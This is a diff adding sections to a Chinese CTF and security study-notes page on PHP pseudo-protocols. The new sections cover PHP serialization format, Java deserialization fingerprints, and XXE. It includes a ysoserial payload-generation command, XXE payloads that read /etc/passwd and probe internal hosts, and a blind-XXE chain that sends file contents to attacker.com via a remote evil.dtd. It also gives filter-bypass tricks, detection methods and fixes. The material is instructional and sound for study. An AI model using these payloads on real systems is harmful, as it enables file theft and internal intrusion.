@@ -5,7 +5,7 @@ description: 系统梳理 PHP 伪协议（php://filter、php://input、data://�
   发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
   与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链，并新增 Pikachu 靶场 PHP 反序列化漏洞实战复现案例。本次更新整合
   BUUCTF 实战题目（WarmUp、include1、Secret File、nizhuansiwei、php、facebook、ZJCTF、easy_serialize_php、PHPWEB、had
-  a had day 等）的详细利用链与绕过细节。
+  a had day 等）的详细利用链与绕过细节，并补充 Java 反序列化特征识别与 XXE 漏洞利用、绕过、修复方案。
 category: program-analysis
 tags:
 - PHP
@@ -28,12 +28,19 @@ tags:
 - BUUCTF
 - 对象逃逸
 - PHAR反序列化
+- Java反序列化
+- XXE
+- ysoserial
+- Base64
+- UTF-16BE
 date: '2020-10-01'
 updated: '2026-11-14'
 ---
 ## 概述
 
 本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场**、**Pikachu 靶场** 及 **BUUCTF** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]] 相关题解。
+
+**本次更新**整合了 **XD安全 Day37-39 学习笔记**，补充了 PHP 序列化字符串格式的细节（整型 `i:value`）、Java 反序列化的特征识别（`rO0AB`/`aced`）、`ysoserial` 工具链使用、以及 XXE 漏洞的利用姿势（文件读取、内网探测、盲注带外数据外带、UTF-16BE 编码绕过、外部 DTD 攻击）及修复方案。
 
 ## PHP 常见伪协议速查
 
@@ -53,6 +60,30 @@ updated: '2026-11-14'
 | **phar://** | PHAR 归档文件访问（触发反序列化） | `phar.readonly=Off` | `phar:///path/to/archive.phar` |
 
 > **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen/curl` 等读取函数受 `allow_url_fopen` 影响。SSRF 场景多依赖 `curl`、`file_get_contents`、`fopen` 等支持远程协议的函数。
+
+---
+
+## 序列化字符串格式解析
+
+> 来源：XD安全 Day37 学习笔记
+
+PHP `serialize()` 输出的字符串遵循特定的类型标识符与长度/值格式，理解该格式是构造手工 Payload、绕过正则过滤（如 `Web_php_unserialize` 中的 `+` 号绕过）的基础。
+
+| 类型 | 标识符 | 格式示例 | 说明 |
+| :--- | :--- | :--- | :--- |
+| **整型** | `i` | `i:19;` | **无需双引号，无需长度声明**，直接值。 |
+| **浮点型** | `d` | `d:1.23;` | 同整型。 |
+| **布尔型** | `b` | `b:1;` / `b:0;` | 值为 1 或 0。 |
+| **空值** | `N` | `N;` | 无值部分。 |
+| **字符串** | `s` | `s:9:"xiaodi123";` | 长度为字节数，含双引号。 |
+| **数组** | `a` | `a:2:{i:0;s:3:"abc";i:1;i:123;}` | 键值对序列，键可为整型/字符串。 |
+| **对象** | `O` | `O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:20;}` | `类名长度:"类名":属性数:{属性序列化}`。 |
+| **引用** | `R` / `r` | `R:1;` / `r:1;` | 引用变量/对象。 |
+
+**关键细节**：
+- 对象属性若为 `private`，序列化名为 `\00ClassName\00prop`（含两个空字节，长度计算需包含）；
+- 若为 `protected`，名为 `\00*\00prop`；
+- **整型数值不带引号和长度**，这是手工修改 Payload 时常见的错误点（如误写为 `i:2:"19";`）。
 
 ---
 
@@ -1009,6 +1040,133 @@ $phar->stopBuffering();
 
 ---
 
+## Java 反序列化基础与特征识别
+
+> 来源：XD安全 Day37-38 学习笔记
+
+### 核心 API
+
+*   **序列化**：`java.io.ObjectOutputStream` -> `writeObject(obj)`
+*   **反序列化**：`java.io.ObjectInputStream` -> `readObject()`
+*   **文件约定**：序列化文件通常使用 `.ser` 扩展名。
+
+### 特征识别 (黑盒判断)
+
+| 编码形式 | 特征字符串/字节 | 说明 |
+| :--- | :--- | :--- |
+| **Base64** | 以 `rO0AB` 开头 | Java 序列化数据 Base64 编码后的典型特征。 |
+| **Hex (十六进制)** | 以 `aced` 开头 | Java 序列化流的 Magic Number (`0xACED`) 及版本号 (`0x0005`)。 |
+
+> **Base64 作用**：将不可打印的二进制序列化字节转为可打印 ASCII 字符，便于在 HTTP 头、Cookie、JSON 等文本协议中传输。
+
+### 利用工具链：ysoserial
+
+*   **项目地址**：[frohoff/ysoserial](https://github.com/frohoff/ysoserial)
+*   **核心功能**：生成利用常见库 (CommonsCollections, Spring, Groovy 等) Gadget Chain 的恶意序列化 Payload。
+*   **使用示例**：
+    ```bash
+    # 生成 CommonsCollections1 链执行命令，输出 Base64
+    java -jar ysoserial-all.jar CommonsCollections1 "calc.exe" | base64
+    ```
+*   **注意**：`readObject` 执行命令通常**无回显**，实战中常需反弹 Shell 或使用 DNSLog/HTTP 请求带外验证。
+
+### 反序列化数据分析工具：SerializationDumper
+
+*   用于解析已有的序列化流 (Base64/Hex 解码后)，还原对象图结构，辅助分析 Gadget Chain 入口点。
+*   配合 `ysoserial` 反向操作：解码 -> 分析结构 -> 确定利用链 -> 生成 Payload。
+
+---
+
+## XXE 漏洞利用与绕过补充
+
+> 来源：XD安全 Day39 学习笔记、[[xxe-xml-dtd-fundamentals]]
+
+XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特性，造成文件读取、SSRF、RCE 等危害。与 PHP 伪协议利用有异曲同工之妙 (均利用协议封装)。
+
+### 基础利用：任意文件读取
+
+**Payload 模板**：
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+*   **原理**：定义外部实体 `xxe` 指向 `file://` 协议，在 XML 数据中引用 `&xxe;` 触发解析器读取文件内容并回显。
+
+### 进阶利用：内网探测与攻击内网应用 (SSRF)
+
+利用 `http://` 或 `gopher://` 等协议探测内网端口、攻击内网 Web 服务。
+
+**Payload 示例 (探测 192.168.1.1:8080)**：
+```xml
+<!DOCTYPE root [
+    <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/index.txt">
+]>
+<root>&xxe;</root>
+```
+
+### 无回显利用：带外数据外带 (OOB / Blind XXE)
+
+当应用不回显实体内容时，需将数据发送到攻击者控制的服务器。
+
+#### 方法一：HTTP 协议外带 (需目标服务器出网)
+
+```xml
+<!DOCTYPE root [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+    %dtd;
+    %send;
+]>
+```
+**攻击者服务器 `evil.dtd` 内容**：
+```dtd
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
+%payload;
+```
+*   **原理**：参数实体 (`%name;`) 只能在 DTD 中声明和引用。通过加载远程 DTD，动态构造发送数据的实体 `send`。
+
+#### 方法二：FTP 协议外带 (适用于仅允许 FTP 出网环境)
+
+原理类似，`evil.dtd` 中 `send` 实体使用 `ftp://attacker.com/%file;`。
+
+#### 方法三：本地 DTD 复用 (绕过出网限制)
+
+若目标禁止出网，可尝试利用本地已有的 DTD 文件 (如 `file:///usr/share/yelp/dtd/docbookx.dtd`) 构造类似利用链，但受限于本地 DTD 结构，通用性较低。
+
+### 编码绕过：UTF-16BE
+
+当过滤器拦截 `<!ENTITY`、`SYSTEM`、`file://` 等关键字时，可尝试将 XML 内容编码为 **UTF-16BE** (Big Endian)，并在 XML 声明中指定编码。
+
+*   **原理**：部分 XML 解析器支持自动检测 UTF-16 BOM (Byte Order Mark) 或声明编码并解码，而 WAF/过滤器可能仅匹配 ASCII/UTF-8 字节流，导致绕过。
+*   **操作**：将 Payload 转为 UTF-16BE 字节流 (每字符前补 `\x00`)，发送原始字节数据。
+*   **参考**：<https://cnblogs.com/20175211lyz/p/11413335.html>
+
+### 协议绕过
+
+若 `http://`、`file://` 被过滤，尝试 `ftp://`、`gopher://`、`dict://`、`jar://`、`netdoc://` 等 PHP/Java 支持的协议。
+
+### 漏洞发现与检测
+
+1.  **流量特征**：抓包查看 `Content-Type` 为 `application/xml`、`text/xml`、`application/x-xml` 等。
+2.  **手工测试**：修改请求体为 XML 格式，注入 `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` 并引用 `&xxe;`，观察报错或回显。
+3.  **自动化工具**：
+    *   **XXEinjector** (Ruby 编写) - 自动化 Fuzz Payload、带外验证。
+    *   **Goby / Nessus / Nmap / Xray** - 集成 XXE 检测插件。
+
+### XXE 修复方案
+
+| 语言/库 | 核心防御代码/配置 |
+| :--- | :--- |
+| **PHP (libxml)** | `libxml_disable_entity_loader(true);` (PHP < 8.0) <br> PHP 8.0+ 默认禁用外部实体。 |
+| **Java (DocumentBuilderFactory)** | `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);` <br> `dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);` <br> `dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);` <br> `dbf.setExpandEntityReferences(false);` |
+| **Python (lxml/defusedxml)** | 使用 `defusedxml` 库替代标准库；或 `parser = etree.XMLParser(resolve_entities=False, no_network=True)` |
+| **通用策略** | 1. 禁用外部实体解析 (最彻底)。<br> 2. 过滤用户输入 XML 中的 `<!DOCTYPE`、`<!ENTITY` 关键字 (防御不完全，易绕过)。<br> 3. 使用不支持 DTD 的简化解析器。 |
+
+---
+
 ## 核心知识点总结
 
 ### 伪协议组合拳
@@ -1039,6 +1197,15 @@ $phar->stopBuffering();
 4.  **工具链熟练度**：`Gopherus` (生成 gopher payload)、`FastCGI Client` (Python/Go 版)、`Redis CLI` / `Gopherus Redis` 模块、`curl` / `nc` 验证 TCP 报文。
 5.  **绕过组合拳**：实际环境常组合多种绕过 (如 DNS 重绑定 + gopher 攻击 Redis)，需灵活搭配。
 
+### Java 反序列化 & XXE 速查
+
+*   **特征**：`rO0AB` (Base64) / `aced` (Hex) -> 确认为 Java 反序列化点。
+*   **工具**：`ysoserial` 生成 Payload，`SerializationDumper` 分析结构。
+*   **XXE 核心**：外部实体 + 协议封装 (`file://`, `http://`, `ftp://`)。
+*   **Blind XXE**：参数实体 (`%name;`) + 远程 DTD (`evil.dtd`) + 带外信道 (HTTP/FTP/DNSLog)。
+*   **绕过**：UTF-16BE 编码、协议替换、大小写混淆、注释干扰。
+*   **修复**：禁用外部实体 (代码层面 `setFeature` / `libxml_disable_entity_loader`)。
+
 ## 关联页面
 
 *   [[007攻防实验室]] - 文章来源归档库，包含更多 CTF 实战笔记（赣网杯2020等）。
@@ -1050,6 +1217,8 @@ $phar->stopBuffering();
 *   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化/SSRF Getshell 后的后续操作参考。
 *   [[internal-network-pivoting-techniques]] - 内网穿透/横向移动技术体系，SSRF 获取内网立足点后的代理隧道搭建实战。
 *   [[buuctf-web-writeup-collection]] - BUUCTF Web 方向题目完整解题思路汇总，按漏洞类型分类并交叉引用现有技术页面。
+*   [[xxe-xml-dtd-fundamentals]] - XXE 漏洞利用核心基础：XML 语法树结构、DTD 声明类型、实体引用分类、PCDATA 与 CDATA 差异，及外部实体通过 file/http 等协议实现任意文件读取的攻击原理。
+*   [[mongodb-nosql-injection-guide]] - MongoDB NoSQL 注入指南，涉及反序列化对象注入变种利用思路对比参考。
 
 ## 参考资源
 
@@ -1066,7 +1235,12 @@ $phar->stopBuffering();
 *   Redis 未授权访问利用: https://blog.csdn.net/mysteryflower/article/details/94386461
 *   DNS Rebinder: https://lock.cmpxchg8b.com/rebinder.html
 *   PHAR 反序列化利用: https://www.leavesongs.com/PENETRATION/php-phar-unserialize.html
+*   ysoserial: https://github.com/frohoff/ysoserial
+*   Java 反序列化规范: https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html
+*   XXE 防御备忘单 (OWASP): https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
 
 ## 来源
 
 - [0x00实验室-202108-202304_080](../sources/0x00实验室-202108-202304_080.md)
+- [XD安全 Day37-39 学习笔记](../sources/XD安全-反序列化与XXE笔记.md) (归档文章内容整合)
+- [0x00实验室-202108-202304_089](../sources/0x00实验室-202108-202304_089.md)
